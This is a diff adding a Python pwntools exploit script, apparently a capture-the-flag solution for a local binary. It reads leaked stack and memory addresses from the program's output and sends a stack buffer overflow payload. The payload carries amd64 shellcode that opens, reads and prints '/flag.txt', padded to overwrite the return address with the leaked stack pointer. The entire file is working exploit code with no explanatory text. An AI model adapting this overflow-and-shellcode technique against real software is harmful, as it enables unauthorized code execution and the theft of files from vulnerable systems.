@@ -1,0 +1,56 @@
+from pwn import*
+context.binary = exe = ELF('./main',checksec=False)
+p = process(exe.path)
+
+ofs = 1032
+
+p.recvuntil(b'mylib.dll ')
+st_lk = int(p.recv(14),16)
+p.recvuntil(b'TestStackTrace ')
+rw_lk = int(p.recv(8),16)
+
+log.info(f'Stack leak: {hex(st_lk)}')
+
+log.info(f'R/W leak: {hex(rw_lk)}')
+
+input()
+
+shellcode = asm(
+    '''
+    mov rax, 257
+    mov rdi, -100
+    lea rsi, [rip + flag_txt]
+    xor rdx, rdx
+
+    syscall
+
+    mov rbx, rax
+    mov rax, 0
+    mov rdi, rbx
+    mov rsi, 0x404029
+    mov rdx, 0x50
+
+    syscall
+
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, 0x404029
+    mov rdx, 0x50
+
+    syscall
+
+    flag_txt:
+        .ascii "/flag.txt"
+    
+    ''', arch = 'amd64')
+
+payload = shellcode
+payload = payload.ljust(524,b'\0')
+payload += b'a'*500 
+payload += p64(st_lk)
+payload += p64(st_lk)
+
+p.sendline(payload)
+
+p.interactive()
+
